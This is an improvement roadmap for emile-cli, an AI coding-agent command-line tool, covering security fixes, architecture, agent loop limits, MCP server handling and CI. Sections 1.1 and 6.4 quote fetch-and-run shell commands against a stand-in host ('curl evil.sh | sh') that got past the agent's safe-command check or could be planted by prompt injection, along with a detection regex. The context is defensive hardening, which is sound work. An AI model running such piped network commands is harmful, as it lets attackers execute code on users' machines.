# emile-cli — Improvement Roadmap

> **Generated:** 2026-08-29 · **Base branch:** `fix/context-aware-compression` · **Commit:** `3811728`
> **Scope:** improvements derived from full project analysis — security, architecture, agent behaviour, features, and open-source readiness.

---

## Index

1. [Security](#1-security-p0)
2. [Architecture & code structure](#2-architecture--code-structure)
3. [Agent behaviour](#3-agent-behaviour)
4. [Model catalog](#4-model-catalog)
5. [MCP integration](#5-mcp-integration)
6. [Error handling & UX](#6-error-handling--ux)
7. [New features](#7-new-features)
8. [Open-source readiness](#8-open-source-readiness)

---

## 1. Security (P0)

These must be addressed before any public release. All fixes are small in scope but high in impact.

### 1.1 Harden `isSafeCommand` against metacharacter injection

**Problem:** `isSafeCommand` checks only the command prefix. `ls && curl evil.sh | sh` matches the `ls` prefix and runs without confirmation in safe mode. Verified by live execution during analysis.

**Fix:** ✅ delivered in `fix/security-hardening`. After a whitelist prefix match, `isSafeCommand` rejects shell metacharacters including chaining, pipes, substitutions, redirects and newlines.

```js
const METACHARACTERS = /[;&|`$><\n]|\|\||&&/;

function isSafeCommand(cmd) {
  const clean = cmd.trim().toLowerCase();
  const matched = SAFE_COMMANDS.some(
    safe => clean === safe || clean.startsWith(safe + ' ')
  );
  if (!matched) return false;
  return !METACHARACTERS.test(cmd); // reject if metacharacters present
}
```

Negative cases are covered by `test/security.test.js`.

---

### 1.2 Resolve symlinks in tool handlers

**Problem:** `resolveSafePath` validates paths via `path.resolve` + relative check, but does not resolve symlinks. A symlink inside the workspace pointing outside allows `readFile`/`writeFile` to escape the sandbox.

**Fix:** ✅ delivered in `fix/security-hardening`. `resolveSafePath` resolves existing paths before the workspace-boundary check, including symlink escapes; new write paths retain their lexical boundary validation.

```js
import { realpathSync } from 'fs';

export function resolveSafePath(workspace, userPath) {
  const resolved = path.resolve(workspace, userPath);
  let real;
  try {
    real = realpathSync(resolved);
  } catch {
    real = resolved; // file doesn't exist yet (write path) — skip realpath
  }
  if (!real.startsWith(workspace + path.sep) && real !== workspace) {
    throw new Error('Path escape attempt detected');
  }
  return resolved;
}
```

---

### 1.3 Filter `process.env` propagated to MCP servers

**Problem:** `mcp.js` passes the full `process.env` to every STDIO server. Third-party MCP processes receive all API keys present in the environment.

**Fix:** ✅ delivered in `fix/security-hardening`. STDIO MCP children receive the portable environment allowlist plus explicit per-server `env` overrides; the parent environment is not copied wholesale.

```js
const MCP_ENV_ALLOWLIST = [
  'PATH', 'HOME', 'LANG', 'LC_ALL', 'LC_CTYPE',
  'SHELL', 'TERM', 'TMPDIR', 'TMP', 'TEMP',
  'USER', 'USERNAME', 'LOGNAME', 'XDG_RUNTIME_DIR',
  'SYSTEMROOT', 'COMSPEC', // Windows
];

function buildMcpEnv() {
  return Object.fromEntries(
    MCP_ENV_ALLOWLIST
      .filter(k => k in process.env)
      .map(k => [k, process.env[k]])
  );
}
```

If specific server configs need additional variables (e.g., `GITHUB_TOKEN` for a GitHub MCP server), allow per-server `env` overrides in `mcp.json`.

---

### 1.4 Fix `editFile` ambiguous match

**Problem:** `IMPROVEMENTS.md §1.1` documents multi-occurrence detection as delivered, but `edit-file.js` calls `replace()` which replaces only the first occurrence silently. Docs and code are divergent.

**Fix:** ✅ delivered in `fix/security-hardening`. The handler counts occurrences before replacing and returns an actionable ambiguity error when `count > 1`, prompting the model to provide more context.

```js
const occurrences = (content.match(escapedTarget) || []).length;
if (occurrences === 0) { /* not found path */ }
if (occurrences > 1) {
  return { error: `Ambiguous match: "${targetContent}" found ${occurrences} times. Provide more surrounding context.` };
}
```

---

### 1.5 Cap `undoStack` at 50 entries

**Problem:** `IMPROVEMENTS.md §1.5` and the roadmap document "capped at 50 entries" — the cap does not exist in `file-state.js`. `undoStack` grows unbounded for the session lifetime.

**Fix:** ✅ delivered in `fix/security-hardening`. `pushUndo` trims the stack to the documented 50-entry limit after each change.

```js
undoStack.push({ path, content: previousContent });
if (undoStack.length > 50) undoStack.shift();
```

---

## 2. Architecture & code structure

### 2.1 Split `cli.js` into per-command modules

**Problem:** `cli.js` is 478 lines and contains inline logic for `/export`, `/cost`, `/sessions`, `/switch`, `/undo`, `/thinking`, `/rules`, `/help`, and the full REPL loop. Every new slash command makes it worse.

**Implemented structure:**

```
src/
  cli.js              ← bootstrap + REPL loop only (~100 lines)
  commands/
    index.js          ← exact-name command registry
    handlers.js       ← handlers receiving explicit REPL context
```

`cli.js` imports the registry and dispatches exact command names; unknown slash-like input remains a normal agent prompt. The handlers preserve the existing session, filesystem, MCP shutdown and UI behavior. Adding a command now changes the command domain without adding another branch to the REPL loop. Implemented in `specs/2026-08-30-cli-command-modules`.

---

### 2.2 Improve `sessionSummary` beyond first message

**Problem:** `sessionSummary` is set from the first user message and never updated. After a long session, the title in `/sessions` is misleading.

**Fix:** implemented in `specs/2026-08-30-session-resilience`; generate a short bounded summary (effort `low`, no cache) after the second completed turn, then update it every 10 turns while preserving the previous title if the summary call fails.

```js
async function updateSessionSummary(messages, currentSummary) {
  if (messages.length < 4) return currentSummary; // too early
  const response = await summarize(messages.slice(-10), 'low');
  return response.trim().slice(0, 120);
}
```

---

### 2.3 Checkpoint session before tool execution

**Problem:** session is only saved after a successful turn. A crash during tool execution (e.g., a long `runCommand`) loses the entire turn, including all LLM output that preceded it.

**Fix:** implemented in `specs/2026-08-30-session-resilience`; save `tool_pending` metadata before and after each tool result, detect it on session load, recover only calls without persisted results through the existing tool handlers, and mark the session complete afterward.

---

### 2.4 Migrate `picocolors` usage to the UI layer

**Problem:** `agent/agent.js`, `agent/compression.js`, `plans.js`, and `api/client.js` use `picocolors` or raw ANSI codes directly, violating the project rule that only `ui/` handles rendering.

**Fix:** implemented in `specs/2026-08-30-ui-logging-prompt`; agent, compression, plans and API status output now consume the canonical `C` palette, with no duplicate color helpers or direct `picocolors` imports.

---

### 2.5 Unify the system prompt language

**Problem:** `src/prompt.js` mixes English and Portuguese inside the "CODING & TASK EXECUTION" block ("Antes de criar…", "Proibição de Presunção…"). This is confusing for external contributors and may cause inconsistent model behaviour across providers.

**Fix:** implemented in `specs/2026-08-30-ui-logging-prompt`; the base coding/task policy is now entirely English while preserving its safety and verification requirements.

---

## 3. Agent behaviour

### 3.1 Cap agentic loop iterations

**Problem:** no maximum iteration limit. A model stuck in a tool-calling loop runs until the context window fills, burning tokens with no user intervention.

**Fix:** ✅ delivered in `fix/security-hardening`. The agent loop uses the configurable `maxLoopIterations` setting (default 40) and warns before stopping at the bounded limit.

```js
if (iterations >= MAX_ITERATIONS_WARN) {
  ui.warn(`Agent has completed ${iterations} iterations. Continue?`);
  const ok = await confirm();
  if (!ok) break;
}
```

---

### 3.2 Cap `runCommand` output

**Problem:** `runCommand` returns the full stdout/stderr to the model. A `cat` on a large file or a verbose build log can flood the context window in a single tool result.

**Fix:** ✅ delivered in `fix/security-hardening`. `runCommand` bounds returned output at 50,000 characters and includes an explicit truncation notice.

```
[output truncated — 142 384 chars omitted. Use grep or head/tail for targeted extraction.]
```

---

### 3.3 Force compression on context overflow errors

**Problem:** when the context window is exceeded (HTTP 413 / 400 "context length exceeded"), the error is treated as a generic API error and enters the retry loop. The retry will fail with the same payload.

**Fix:** ✅ delivered in `fix/security-hardening`. Context-overflow responses trigger one forced compression/retry path instead of resending the same oversized payload.

---

### 3.4 Fix Plans mode gate timing

**Problem:** the approval gate fires *after* the plan has already been rendered to the user. Cancelling aborts the turn, but the plan output is already visible — the UX implies the agent is already running.

**Fix:** ✅ implemented in `fix/plans-compression-resilience`. In the first turn with plans mode active, the agent halts before streaming any content, shows a sanitized 120-character preview of the task, asks for approval, and only then allows the full streaming/tool loop. Rejection produces zero model/tool calls.

---

### 3.5 Improve compression fallback on summarisation failure

**Problem:** if the summarisation LLM call fails, the turn continues without compression. The next call may hit the context limit.

**Fix:** ✅ implemented in `fix/plans-compression-resilience`. On summarisation failure, the agent drops the oldest complete user-turn groups until the serialized history reaches 70% of the active context window when possible, preserving the primary system message and newest group; hysteresis prevents an immediate retry loop.

---

## 4. Model catalog

### 4.1 Use the dynamic catalog in `/model` and the wizard

**Problem:** `commands.js` maintains a separate static model list with hypothetical identifiers ("deepseek-v4-pro", "kimi-k2.7", "glm-5.2") that may not exist on the actual APIs. `models.js` already fetches and caches a live catalog from OpenRouter (TTL 24h), but the wizard does not use it.

**Fix:** ✅ delivered in `feat/dynamic-model-catalog-ui`:

1. ✅ `initModelCatalog()` is called at startup and `/model` waits for its best-effort completion when OpenRouter is active.
2. ✅ The OpenRouter wizard now uses normalized live-catalog entries; other providers retain curated lists because the source cannot validate their compatibility.
3. ✅ `/model` presents dynamic models with context-window and input/output pricing metadata from `MODEL_INFO`.

---

### 4.2 Validate model on provider switch

**Problem:** changing provider via `/connect` does not verify that the currently selected model exists for the new provider. The next turn will fail with a model-not-found error.

**Fix:** ✅ delivered in `fix/security-hardening`. After a provider switch, the current model is checked against the new provider's catalog and a replacement can be selected before proceeding.

---

## 5. MCP integration

### 5.1 Reconnect on server death

**Problem:** if an MCP server process crashes mid-session, its tools silently disappear. There is no retry or notification.

**Fix:** ✅ implemented in `feat/mcp-resilience-transports`. Transport close events trigger bounded reconnect at 500ms → 1s → 2s (maximum three attempts), with a warning after failure; intentional shutdown cancels the retry path.

```js
server.process.on('exit', async (code) => {
  if (code !== 0) {
    ui.warn(`MCP server "${name}" exited unexpectedly. Reconnecting…`);
    await retryConnect(name, config, { maxAttempts: 3 });
  }
});
```

---

### 5.2 Fix namespacing collision edge case

**Problem:** tool name resolution splits on the first `__`. A server named `a` with a tool `b__c`, and a server named `a__b` with a tool `c`, both resolve to `a__b__c` via the current logic.

**Fix:** ✅ delivered in `fix/security-hardening`. MCP dispatch uses an explicit `Map` keyed by the complete server/tool name, so separators in either component remain unambiguous.

```js
const toolMap = new Map(); // 'server__tool' → { server, toolName }

for (const [serverName, tools] of servers) {
  for (const tool of tools) {
    const key = `${serverName}__${tool.name}`;
    toolMap.set(key, { server: serverName, toolName: tool.name });
  }
}
```

Resolution becomes a direct Map lookup — no string parsing, no ambiguity.

---

### 5.3 Warn on first connection of a new MCP server

**Problem:** a new MCP server in `mcp.json` connects silently with full tool access. There is no friction for a server the user has never connected before.

**Fix:** ✅ implemented in `feat/mcp-resilience-transports`. First connections require a fail-closed confirmation showing the server, transport, sanitized endpoint and configured tool metadata; approval is tracked per workspace in `.emile/mcp-consent.json` and never stores credentials.

---

### 5.4 Add SSE/HTTP transport support

**Problem:** only STDIO transport is supported, limiting MCP to local processes.

**Fix:** ✅ implemented in `feat/mcp-resilience-transports`. `transport: "sse"` and `transport: "http"` select the official SDK transports; remote URLs are HTTP(S)-only and header values support fail-closed `${ENV_NAME}` interpolation.

```json
{
  "servers": {
    "my-remote-server": {
      "transport": "http",
      "url": "https://mcp.example.com",
      "headers": { "Authorization": "Bearer ${MY_TOKEN}" }
    }
  }
}
```

---

## 6. Error handling & UX

### 6.1 Route all warnings through the UI layer

**Problem:** `src/config.js` and `src/mcp.js` call `console.warn` directly, bypassing the TUI and breaking the visual layout mid-session.

**Fix:** ✅ delivered in `specs/2026-08-30-ui-logging-prompt`. Low-level modules use the UI logging surface backed by the Tokyo Night palette instead of raw user-facing warnings/errors.

---

### 6.2 Friendly error messages for common API failures

✅ Delivered in `feat/error-ux`: API failures use a small secret-free classification layer in `api/client.js`:

| Condition | User-facing message |
|---|---|
| 401 / invalid key | `Authentication failed. Check your API key with /connect.` |
| 404 / model not found | `Model "${model}" not found for this provider. Use /model to switch.` |
| 413 / 400 context length | `Context window exceeded. Compressing history and retrying…` |
| 429 with no `Retry-After` | `Rate limited. Waiting 10s before retry…` |
| Network timeout | `Request timed out. Check your connection.` |
| Provider fallback triggered | `Primary model unavailable — falling back to free tier.` |

---

### 6.3 Surface MCP tool execution in the UI

**Problem:** MCP tool calls are transparent to the user — they look identical to built-in tool calls and there is no indication that a third-party process is involved.

**Fix:** ✅ implemented in `feat/mcp-tool-visibility`. MCP tool summaries now show `[mcp:filesystem] readFile`, splitting at the final namespace separator so server names containing `__` remain unambiguous. Built-in tool labels remain unchanged.

---

### 6.4 `runCommand` network-pipe warning

**Problem:** commands like `curl | sh` or `wget | bash` are high-risk and can be injected via prompt injection from file contents. The safe mode gate confirms, but the confirmation message is generic.

**Fix:** ✅ implemented in `feat/error-ux`. Detect common network-pipe patterns and surface a specifically-worded warning in the existing confirmation prompt:

```
⚠  This command pipes network content to a shell interpreter.
   This is a common prompt-injection vector.
   Command: curl https://evil.sh | sh
   Run anyway? [y/N]
```

---

## 7. New features

### 7.1 Multi-level undo

**Current state:** ✅ multi-level undo is delivered; this section records the original single-level limitation.

**Fix:** ✅ implemented in `feat/multilevel-undo`. `undoStack` retains `{ path, content }`; `/undo` restores one entry, while `/undo N` validates the bounded count, displays affected paths, confirms, and restores the last N entries newest-first. Cancellation and invalid counts leave the stack untouched.

No changes to the storage format — only the command parser and the restore loop.

---

### 7.2 Skill relevance matching

**Current state:** ✅ relevance filtering is delivered; this section records the original dependency-heuristic limitation.

**Fix:** ✅ implemented in `feat/skill-relevance`. Auto-detected skills now use lightweight keyword overlap between the current user message and each skill's name/description; irrelevant skills are omitted, `clean-code` remains active, and explicit `-s` lists bypass filtering. Existing size caps remain in force.

This reduces prompt size for unrelated tasks and keeps cache prefixes more stable.

---

### 7.3 Native Anthropic thinking budget support

**Current state:** `-e low/medium/high` maps to `reasoning_effort` (OpenAI format). Providers serving Anthropic models natively (or via Requesty) may use a different parameter (`thinking.budget_tokens`).

**Fix:** ✅ implemented in `feat/anthropic-thinking-budget`. Requesty Anthropic-family models now receive `thinking: { type: "enabled", budget_tokens }` using bounded effort budgets (512–16,384); `none` emits disabled thinking, OpenRouter keeps its unified `reasoning` object, and other models keep the capability-gated compatibility mapping.

```js
function buildReasoningParams(provider, model, effort) {
  if (isAnthropicNative(provider, model)) {
    return { thinking: { type: 'enabled', budget_tokens: BUDGET_MAP[effort] } };
  }
  return { reasoning_effort: effort };
}
```

---

### 7.4 `reasoning_details` format support (OpenRouter)

**Current state:** streaming reasoning is parsed from `reasoning_content`, `reasoning` and OpenRouter's `reasoning_details` delta fields. Structured blocks are preserved for tool-call continuation, and readable reasoning is expanded by default in the terminal.

**Fix:** implemented in `specs/2026-08-30-reasoning-details-display`; OpenRouter now receives its unified `reasoning` object, readable text/summary fields are normalized to the existing thinking stream, while encrypted/unknown blocks are preserved but never rendered. `/thinking` and Ctrl+P collapse or expand the same live and completed reasoning state.

---

### 7.5 Session file size management

**Current state:** ✅ persisted snapshots are bounded by the configured session-size limit; this section records the original unbounded-storage limitation.

**Fix:** ✅ implemented in `feat/session-size-management`. Added `--max-session-size`/`EMILE_MAX_SESSION_SIZE` (default 10MB); when needed, oldest tool results become `[truncated]` in the persisted snapshot only, leaving memory unchanged. `/sessions clean <days>` removes only records older than the positive age supplied.

---

### 7.6 Cap skills size in system prompt

**Current state:** ✅ skill-size caps are delivered; this section records the original uncapped-skill limitation.

**Fix:** ✅ delivered in `fix/security-hardening`. Skills are capped at 8,000 characters each and 24,000 characters in total, with explicit truncation/omission notices.

---

### 7.7 Trim `reasoning_content` from persisted history

**Current state:** ✅ persisted sessions omit `reasoning_content` by default and exports require explicit opt-in; this section records the original retention behavior.

**Fix:** ✅ implemented in `feat/session-reasoning-retention`. `reasoning_content` is removed from the non-mutating persisted message projection while remaining in memory for the active session. `/export` omits thought blocks by default and includes them only with the explicit `--export-thinking` flag.

---

## 8. Open-source readiness

### 8.1 Add `npm test` and `npm run lint` scripts

**Current state:** ✅ delivered in `chore/open-source-readiness`. `package.json` exposes both project-wide gates and the repository includes a committed ESLint configuration.

**Fix:** ✅ delivered in `chore/open-source-readiness`:

```json
"scripts": {
  "start": "node bin/emile.js",
  "test": "node --test test/*.test.js",
  "lint": "eslint src/ test/ bin/ --ext .js"
}
```

The committed `.eslintrc.json` is configured for ES modules and Node 18+.

---

### 8.2 Add CI via GitHub Actions

**Fix:** ✅ delivered in `chore/open-source-readiness`. The minimum viable pipeline is now committed as `.github/workflows/ci.yml`:

```yaml
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: '20' }
      - run: npm ci
      - run: npm run lint
      - run: npm test
```

This gates every push and pull request on lint + test, making external contributions easier to review.

---

### 8.3 Add tests for critical security surfaces

**Current state:** ✅ delivered in `fix/security-hardening` and the subsequent quality-gate work. Security paths, edit matching and API retry behavior have focused regression coverage.

**Coverage delivered:**

| Test file | Coverage target |
|---|---|
| `test/security.test.js` | `isSafeCommand` whitelist, metacharacter rejection, `resolveSafePath` traversal + symlink escape |
| `test/edit-file.test.js` | exact match, CRLF normalisation, line-trim fallback, ambiguous match error, not-found error |
| `test/api-client.test.js` | `getRetryDelayMs`, retry on 429/500/network, `Retry-After` header parsing |

---

### 8.4 Register features retroactively in `features/`

**Current state:** ✅ delivered in `docs/feature-registry-completion`. The formerly missing agent loop, plans mode, MCP, skills, compression, session persistence, title and undo capabilities are now represented in the catalog.

**Fix:** ✅ implemented in `docs/feature-registry-completion`. Added template-based entries for the agent loop, built-in tools, plans mode and context compression, and indexed all shipped capabilities in `features/README.md`.

---

### 8.5 Commit working tree dirty files

**Current state:** resolved for the reasoning-render work: the reviewed changes are committed on `fix/reasoning-details-display`, while unrelated user-owned working-tree files remain untouched.

**Action:** keep feature work on its dedicated branch and review `git status` before opening the PR. Do not stage unrelated user-owned files.

---

## Summary table

| # | Area | Priority | Effort | Status |
|---|---|---|---|---|
| 1.1 | Metacharacter injection in `isSafeCommand` | P0 | XS | ✅ Delivered (`fix/security-hardening`) |
| 1.2 | Symlink escape in tool handlers | P0 | XS | ✅ Delivered (`fix/security-hardening`) |
| 1.3 | Filter `process.env` to MCP servers | P0 | XS | ✅ Delivered (`fix/security-hardening`) |
| 1.4 | `editFile` ambiguous match | P0 | S | ✅ Delivered (`fix/security-hardening`) |
| 1.5 | `undoStack` cap | P0 | XS | ✅ Delivered (`fix/security-hardening`) |
| 2.1 | Split `cli.js` into command modules | P1 | M | ✅ Delivered (`refactor/cli-command-modules`) |
| 2.2 | Improve `sessionSummary` | P1 | S | ✅ Delivered (`feat/session-resilience`) |
| 2.3 | Checkpoint before tool execution | P1 | S | ✅ Delivered (`feat/session-resilience`) |
| 2.4 | Migrate `picocolors` to UI layer | P2 | S | ✅ Delivered (`refactor/ui-logging-prompt`) |
| 2.5 | Unify system prompt language | P2 | XS | ✅ Delivered (`refactor/ui-logging-prompt`) |
| 3.1 | Cap agentic loop iterations | P1 | XS | ✅ Delivered (`fix/security-hardening`, cap 40 via `maxLoopIterations`) |
| 3.2 | Cap `runCommand` output | P1 | XS | ✅ Delivered (`fix/security-hardening`, 50k chars) |
| 3.3 | Force compression on overflow errors | P1 | S | ✅ Delivered (`fix/security-hardening`) |
| 3.4 | Fix Plans mode gate timing | P1 | S | ✅ Delivered (`fix/plans-compression-resilience`) |
| 3.5 | Compression fallback on summarisation failure | P2 | S | ✅ Delivered (`fix/plans-compression-resilience`) |
| 4.1 | Use dynamic catalog in wizard and `/model` | P1 | S | ✅ Delivered (`feat/dynamic-model-catalog-ui`) |
| 4.2 | Validate model on provider switch | P1 | XS | ✅ Delivered (`fix/security-hardening`) |
| 5.1 | MCP server reconnect on death | P1 | M | ✅ Delivered (`feat/mcp-resilience-transports`) |
| 5.2 | Fix MCP namespace collision | P1 | XS | ✅ Delivered (`fix/security-hardening`) |
| 5.3 | Warn on first MCP server connect | P2 | S | ✅ Delivered (`feat/mcp-resilience-transports`) |
| 5.4 | SSE/HTTP MCP transport | P3 | L | ✅ Delivered (`feat/mcp-resilience-transports`) |
| 6.1 | Route warnings through UI layer | P1 | S | ✅ Delivered (`src/ui/log.js`; config.js migrated) |
| 6.2 | Friendly API error messages | P1 | S | ✅ Delivered (`feat/error-ux`) |
| 6.3 | Surface MCP server name in tool display | P2 | XS | ✅ Delivered (`feat/mcp-tool-visibility`) |
| 6.4 | Network-pipe command warning | P2 | XS | ✅ Delivered (`feat/error-ux`) |
| 7.1 | Multi-level undo | P2 | S | ✅ Delivered (`feat/multilevel-undo`) |
| 7.2 | Skill relevance matching | P2 | M | ✅ Delivered (`feat/skill-relevance`) |
| 7.3 | Anthropic thinking budget support | P2 | S | ✅ Delivered (`feat/anthropic-thinking-budget`) |
| 7.4 | `reasoning_details` stream format | P2 | XS | ✅ Delivered (`fix/reasoning-details-display`) |
| 7.5 | Session file size management | P2 | M | ✅ Delivered (`feat/session-size-management`) |
| 7.6 | Cap skills size in system prompt | P1 | XS | ✅ Delivered (`fix/security-hardening`, 8k/skill + 24k total) |
| 7.7 | Trim `reasoning_content` from persisted history | P2 | S | ✅ Delivered (`feat/session-reasoning-retention`) |
| 8.1 | `npm test` / `npm run lint` scripts | P1 | XS | ✅ Delivered (`npm test` + `npm run lint`) |
| 8.2 | GitHub Actions CI | P1 | XS | ✅ Delivered (`.github/workflows/ci.yml`, Node 20) |
| 8.3 | Tests for security surfaces | P0 | M | ✅ Delivered (`test/security.test.js`, `test/edit-file.test.js`, `test/api-client.test.js`) |
| 8.4 | Feature registry backlog | P3 | S | ✅ Delivered (`features/` catalog completed) |
| 8.5 | Commit dirty working tree | P0 | XS | ✅ Delivered (`fix/reasoning-details-display`; unrelated user files preserved) |

**Effort key:** XS < 1h · S = 1–4h · M = 4–8h · L = 1–3 days
